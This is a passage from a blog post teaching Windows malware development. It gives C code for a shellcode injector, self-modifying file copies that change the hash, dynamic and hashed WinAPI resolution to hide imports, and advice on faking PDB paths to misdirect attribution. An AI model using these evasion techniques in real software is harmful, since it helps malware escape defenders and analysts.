<!DOCTYPE html>
<html><head>
    <title>Malware development part 4 – 0xPat blog – Red/purple teamer</title>

        <meta charset="utf-8">
    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

    
    <meta name="description" content="Introduction
This is the fourth post of a series which regards the development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
In the previous part of the series we discussed methods for detecting sandboxes, virtual machines, automated analysis and making manual debugging harder for an analyst.
In this post we will talk more about compiling and linking the code with Visual Studio. Then we will focus on static analysis and obfuscation.

">
    <meta property="og:description" content="Introduction
This is the fourth post of a series which regards the development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.
In the previous part of the series we discussed methods for detecting sandboxes, virtual machines, automated analysis and making manual debugging harder for an analyst.
In this post we will talk more about compiling and linking the code with Visual Studio. Then we will focus on static analysis and obfuscation.

">
    
    <meta name="author" content="0xPat blog">

    
    <meta property="og:title" content="Malware development part 4">
    <meta property="twitter:title" content="Malware development part 4">
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="Malware%20development%20part%204%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/style.css">
    <link rel="alternate" type="application/rss+xml" title="0xPat blog - Red/purple teamer" href="https://0xpat.github.io/feed.xml">

  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          
          <div class="site-info">
            <h1 class="site-name"><a href="https://0xpat.github.io/">0xPat blog</a></h1>
            <p class="site-description">Red/purple teamer</p>
          </div>

          <nav>
            <a href="https://0xpat.github.io/">Blog</a>
            <a href="https://0xpat.github.io/about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Malware development part 4</h1>

  <div class="entry">
    <h2 id="introduction">Introduction</h2>
<p>This is the fourth post of a series which regards the development of 
malicious software. In this series we will explore and try to implement 
multiple techniques used by malicious applications to execute code, hide
 from defenses and persist.<br>
In the previous part of the series we discussed methods for detecting 
sandboxes, virtual machines, automated analysis and making manual 
debugging harder for an analyst.<br>
In this post we will talk more about compiling and linking the code with
 Visual Studio. Then we will focus on static analysis and obfuscation.</p>

<p>Note: we assume 64-bit execution environment - some code samples may 
not work for x86 applications (for example due to hardcoded 8-byte 
pointer length or different data layout in PE and PEB). Also, error 
checks and cleanups are ommited in the code samples below.</p>

<h2 id="executable-creation-with-visual-studio">Executable creation with Visual Studio</h2>

<p>Let’s create a new project in Visual Studio and browse through 
compilation and linking options to see what’s there. We will use this 
simple Metasploit shellcode injector:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\</span><span class="s">xfc</span><span class="se">\\</span><span class="s">x48</span><span class="se">\\</span><span class="s">x83 (...) "</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">shellcode_exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">threadID</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadID</span><span class="p">);</span>
	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Some of compilation and linking settings may introduce changes to the
 binary to make it smaller (thus easier to deliver) or more difficult to
 debug and reverse engineer.</p>

<h3 id="compiler-options">Compiler options</h3>

<h4 id="c-runtime-library-mt">C runtime library (/MT)</h4>

<p>First thing we should do is to force application to use <a href="https://docs.microsoft.com/en-us/cpp/build/reference/md-mt-ld-use-run-time-library">static version of runtime</a>
 (CRT) library - otherwise it won’t run on computers without MSVCRT 
installed. This may significantly increase the executable size as the 
necessary libraries must be embedded into it.</p>

<p>When you develop a regular application it’s usually better to use 
shared runtime library available on the system (you can always bundle it
 within the installer). However it’s not the case with malware - we’d 
like it to be as much portable as possible.</p>

<p>There is a way to decrease executable size and use some of CRT features. We can use <code class="language-plaintext highlighter-rouge">msvcrt.dll</code> library which is available on every Windows version since 95. We will need to create own version of static library <code class="language-plaintext highlighter-rouge">msvcrt.lib</code> from the <code class="language-plaintext highlighter-rouge">msvcrt.dll</code> library as described <a href="https://stackoverflow.com/a/39737730">here</a>. Using custom CRT static library instead of one automatically added by Visual Studio (thanks to <code class="language-plaintext highlighter-rouge">/NODEFAULTLIB</code> linker argument) allowed to drop the executable size from almost to just around 4 KB. Also, <code class="language-plaintext highlighter-rouge">_NO_CRT_STDIO_INLINE</code> may have to be defined.</p>

<h5 id="edit">EDIT</h5>

<p>For more details on using builtin <code class="language-plaintext highlighter-rouge">msvcrt.dll</code> check out <a href="https://www.solomonsklash.io/smaller-c-payloads-on-windows.html">this great post by Solomon Sklash</a>.</p>

<h4 id="code-optimization-o1-o2-etc">Code optimization (/O1, /O2 etc.)</h4>

<p>There are two <a href="https://docs.microsoft.com/en-us/cpp/build/reference/o1-o2-minimize-size-maximize-speed">code optimization</a>
 strategies - to favour speed or size. Each causes compiler to apply 
some techniques that change the code and possibly make the assembly a 
little bit harder to read and understand. For example, a debugger may 
not be able to evaluate values of certain (optimized) variables. Some 
instructions can be replaced with less obvious ones which however 
produce the same result. Inline functions can cause the code to be 
harder to understand because it will have a less number of logically 
separated functional blocks.</p>

<p><code class="language-plaintext highlighter-rouge">__forceinline</code> directive can be used to mark specific functions to be inlined during compilation, regardless compiler optimization.</p>

<h3 id="linker-options">Linker options</h3>

<h4 id="debug-information-debug">Debug information (/DEBUG)</h4>

<p>There is a very specific debug information - <code class="language-plaintext highlighter-rouge">.PDB</code>
 file path - that is placed in the final executable which can contain 
sensitive information. Just imagine a pedantic developer with organized 
directory structure and names - <code class="language-plaintext highlighter-rouge">.PDB</code> file path could be for example: <code class="language-plaintext highlighter-rouge">"C:\\users\\nameSurname\\Desktop\\companyName\\clientName\\assessmentDate\\MaliciousApp\\Release\\MaliciousApp.pdb"</code>. It’s very important to dismiss that information from final executable. We could also craft a fake <code class="language-plaintext highlighter-rouge">.PDB</code> file path to fool researchers, for example to get our malware attributed to different group.</p>

<p>Be sure to check out <a href="https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html">this FireEye article</a> on extracting information from malware samples.</p>

<h4 id="uac-settings-in-manifest-manifestuac">UAC settings in manifest (/MANIFESTUAC)</h4>

<p>This particular option does not change the code itself however it’s 
worth mentioning.
We can configure the application to prompt user for consent or 
credentials (depending on system settings) to run with administrative 
privileges. This can sometimes come in handy as a UAC “bypass” - need 
higher privileges? Just ask the user! However this may raise suspicions 
of some users thus should be used ony in specific circumstances. Anyway,
 we can set <a href="https://docs.microsoft.com/en-us/cpp/build/reference/manifestuac-embeds-uac-information-in-manifest">UAC level</a> to <code class="language-plaintext highlighter-rouge">highestAvailable</code> - application will require admin consent or credentials only if the user is a member of local <code class="language-plaintext highlighter-rouge">Administrators</code> group.</p>

<h2 id="static-analysis-and-obfuscation">Static analysis and obfuscation</h2>

<p>Let’s now focus on some more interesting stuff - what we can do to 
obfuscate our code. We want as least information as possible to be 
visible during static inspection of a binary.</p>

<p>Windows executable file (Portable Executable) contains several 
information particularly interesting from the reverse engineer’s 
perspective: headers, sections headers and content (code, resources 
etc.), imported and exported functions, timestamp. An analyst can 
extract a bunch of useful information just by inspecting the executable 
(without running it). This includes the code, imported functions, 
hardcoded strings and other data. Static PE file analysis can also 
indicate use of a packer or other obfuscation techniques. And of course,
 the easiest thing to do is to calculate the file hash and look it up in
 a database (VirusTotal etc.).</p>

<p>So, how do we fight static analysis techniques?</p>

<h3 id="changing-file-hash">Changing file hash</h3>

<p>Knowing that just a single bit change in the file causes its hash to 
be completely different, we can introduce simple polymorphism to the 
code. The basic idea is to replicate the executable while for example 
adding a null byte at the end. More sophisticated approach could include
 introducing changes to a resource (e.g. icon) embedded in the 
executable.</p>

<p>I don’t think it’s possible to delete an executable associated with 
running process. It’s possible though to rename a file which is being 
executed. However we need to start another process which will wait for 
the main process to terminate and then modify the binary on disk and 
relaunch the malicious application. We can also replicate the executable
 (changing the last character of its name) and modify the copy:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">wchar_t</span> <span class="n">oldExecutablePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
<span class="kt">wchar_t</span> <span class="n">newExecutablePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
<span class="kt">size_t</span> <span class="n">executablePathLength</span><span class="p">;</span>
<span class="n">GetModuleFileName</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">oldExecutablePath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">);</span>
<span class="n">StringCchCopy</span><span class="p">(</span><span class="n">newExecutablePath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">oldExecutablePath</span><span class="p">);</span>

<span class="n">StringCchLengthW</span><span class="p">(</span><span class="n">oldExecutablePath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">executablePathLength</span><span class="p">);</span>
<span class="kt">wchar_t</span> <span class="n">mutatingChar</span> <span class="o">=</span> <span class="n">newExecutablePath</span><span class="p">[</span><span class="n">executablePathLength</span> <span class="o">-</span> <span class="mi">5</span><span class="p">];</span>
<span class="n">newExecutablePath</span><span class="p">[</span><span class="n">executablePathLength</span> <span class="o">-</span> <span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">mutatingChar</span> <span class="o">/</span> <span class="mi">2</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="o">!</span><span class="p">(</span><span class="n">mutatingChar</span> <span class="o">%</span> <span class="mi">2</span><span class="p">);</span>
<span class="n">CopyFile</span><span class="p">(</span><span class="n">oldExecutablePath</span><span class="p">,</span> <span class="n">newExecutablePath</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>

<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">newExecutablePath</span><span class="p">,</span> <span class="n">FILE_APPEND_DATA</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">bytesWritten</span><span class="p">;</span>
<span class="n">SetFilePointer</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FILE_END</span><span class="p">);</span>
<span class="kt">char</span> <span class="n">toWrite</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\</span><span class="s">0"</span><span class="p">;</span>
<span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">toWrite</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
	
<span class="c1">// Make sure that newExecutablePath is run next time - e.g. modify persistence entry</span>

</code></pre></div></div>

<h3 id="hiding-imports-via-dynamic-winapi-functions-resolving">Hiding imports via dynamic WinAPI functions resolving</h3>

<p>Import Address Table (IAT) stores information about libraries and 
functions that are used by the application. OS dynamically loads them at
 the executable startup. Very convinient (well it’s just how Windows 
works) however the table contents can give a lot of information about 
program functionality. For example memory operations and thread 
operation functions (<code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, <code class="language-plaintext highlighter-rouge">VirtualProcect</code>, <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>) can indicate that the application is performing some kind of code injection. <code class="language-plaintext highlighter-rouge">WSASocket</code> is often used by bind and reverse shells, and <code class="language-plaintext highlighter-rouge">SetWindowsHookEx</code> by keyloggers.</p>

<p>Our simple code has the following imports (listed using <a href="https://github.com/lucasg/Dependencies">Dependencies</a> tool:</p>

<p><img src="Malware%20development%20part%204%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/imports_1.jpg" alt="../images/2020-08-04-Malware_development_part_4/imports_1.jpg"></p>

<p>To hide this information (from static analysis) we can dynamically 
resolve certain API functions. We could even use syscalls (see userland 
hooks evasion). For now lets just use <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> to obtain handle to <code class="language-plaintext highlighter-rouge">kernel32.dll</code> loaded in memory and then find necessary functions with <code class="language-plaintext highlighter-rouge">GetProcAddress</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PVirtualAlloc</span><span class="p">)(</span><span class="n">PVOID</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">);</span>
<span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PCreateThread</span><span class="p">)(</span><span class="n">PSECURITY_ATTRIBUTES</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">PTHREAD_START_ROUTINE</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">PDWORD</span><span class="p">);</span>
<span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PWaitForSingleObject</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">HMODULE</span> <span class="n">hKernel32</span> <span class="o">=</span> <span class="n">GetModuleHandleW</span><span class="p">(</span><span class="s">L"kernel32.dll"</span><span class="p">);</span>
	<span class="n">PVirtualAlloc</span> <span class="n">funcVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVirtualAlloc</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
	<span class="n">PCreateThread</span> <span class="n">funcCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCreateThread</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"CreateThread"</span><span class="p">);</span>
	<span class="n">PWaitForSingleObject</span> <span class="n">funcWaitForSingleObject</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWaitForSingleObject</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"WaitForSingleObject"</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\</span><span class="s">xfc</span><span class="se">\\</span><span class="s">x48</span><span class="se">\\</span><span class="s">x83 (...) "</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">shellcode_exec</span> <span class="o">=</span> <span class="n">funcVirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">threadID</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">funcCreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadID</span><span class="p">);</span>
	<span class="n">funcWaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Now suspicious functions are resolved dynamically and there’s no indication of them in IAT:</p>

<p><img src="Malware%20development%20part%204%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/imports_2.jpg" alt="../images/2020-08-04-Malware_development_part_4/imports_2.jpg"></p>

<p>Of course we can take obfuscation further and add some irrelevant 
functions to “fill” the IAT and make the application seemingly more 
legitimate. Another important thing to do is to encrypt strings with 
function names - we don’t want them to be visible just by grepping the 
binary.</p>

<h4 id="api-hashing">API hashing</h4>

<p>Instead of encoding/encrypting function names (which the application 
is going to dynamically resolve) we can calculate hashes of all function
 names exported by a specific library and then select appropriate 
functions based on a list of such hashes hardcoded in an executable.</p>

<p>Let’s use some simple hashing function like <a href="http://www.cse.yorku.ca/~oz/hash.html">djb2</a>
 but replace the 5381 constant with something else. We could use any 
hashing function along with a salt to defeat easy hash calculation by 
malware analyst.
We have precalculated hashes for certain <code class="language-plaintext highlighter-rouge">kernel32.dll</code> imports - all we need to do is browse the library exports and calculate functions names hashes.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PVirtualAlloc</span><span class="p">)(</span><span class="n">PVOID</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">);</span>
<span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PCreateThread</span><span class="p">)(</span><span class="n">PSECURITY_ATTRIBUTES</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">PTHREAD_START_ROUTINE</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">PDWORD</span><span class="p">);</span>
<span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PWaitForSingleObject</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">);</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">hash</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">hash</span> <span class="o">=</span> <span class="mi">7759</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">c</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">c</span> <span class="o">=</span> <span class="o">*</span><span class="n">str</span><span class="o">++</span><span class="p">)</span>
		<span class="n">hash</span> <span class="o">=</span> <span class="p">((</span><span class="n">hash</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">hash</span><span class="p">)</span> <span class="o">+</span> <span class="n">c</span><span class="p">;</span>

	<span class="k">return</span> <span class="n">hash</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">HMODULE</span> <span class="n">hKernel32</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">L"kernel32.dll"</span><span class="p">);</span>
	<span class="n">PVirtualAlloc</span> <span class="n">funcVirtualAlloc</span><span class="p">;</span>
	<span class="n">PCreateThread</span> <span class="n">funcCreateThread</span><span class="p">;</span>
	<span class="n">PWaitForSingleObject</span> <span class="n">funcWaitForSingleObject</span><span class="p">;</span>

	<span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pDosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">hKernel32</span><span class="p">;</span>
	<span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pNtHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pDosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
	<span class="n">PIMAGE_OPTIONAL_HEADER</span> <span class="n">pOptionalHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_OPTIONAL_HEADER</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">pNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">);</span>
	<span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pOptionalHeader</span><span class="o">-&gt;</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
	<span class="n">PULONG</span> <span class="n">pAddressOfFunctions</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
	<span class="n">PULONG</span> <span class="n">pAddressOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
	<span class="n">PUSHORT</span> <span class="n">pAddressOfNameOrdinals</span> <span class="o">=</span> <span class="p">(</span><span class="n">PUSHORT</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>

	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">PCSTR</span> <span class="n">pFunctionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pAddressOfNames</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">pFunctionName</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x80fa57e1</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">funcVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVirtualAlloc</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pAddressOfFunctions</span><span class="p">[</span><span class="n">pAddressOfNameOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]);</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">pFunctionName</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xc7d73c9b</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">funcCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCreateThread</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pAddressOfFunctions</span><span class="p">[</span><span class="n">pAddressOfNameOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]);</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">pFunctionName</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x50c272c4</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">funcWaitForSingleObject</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWaitForSingleObject</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">hKernel32</span> <span class="o">+</span> <span class="n">pAddressOfFunctions</span><span class="p">[</span><span class="n">pAddressOfNameOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]);</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\</span><span class="s">xfc</span><span class="se">\\</span><span class="s">x48</span><span class="se">\\</span><span class="s">x83"</span><span class="p">;</span>

	<span class="n">PVOID</span> <span class="n">shellcode_exec</span> <span class="o">=</span> <span class="n">funcVirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">threadID</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">funcCreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadID</span><span class="p">);</span>
	<span class="n">funcWaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<h4 id="bootstrapping-shellcode-style">Bootstrapping: shellcode-style</h4>

<p>Our table of imports now contains <code class="language-plaintext highlighter-rouge">GetModuleHandle</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code>
 functions which happen to be quite strong indicators of malware, 
particularly packed executables. Our application may now be even more 
suspicious than before. Let’s hide these imports, too.</p>

<p>We can leverage several facts (below applies for x64 architecture; offsets are different for x86):</p>

<ol>
  <li>PEB is located at an address relative to <code class="language-plaintext highlighter-rouge">GS</code> register: <code class="language-plaintext highlighter-rouge">GS:[0x60]</code></li>
  <li><code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code> structure (containing information about all loaded modules) is located at <code class="language-plaintext highlighter-rouge">$PEB:[0x18]</code></li>
  <li>Loader data contains pointer to <code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code> at offset <code class="language-plaintext highlighter-rouge">0x20</code></li>
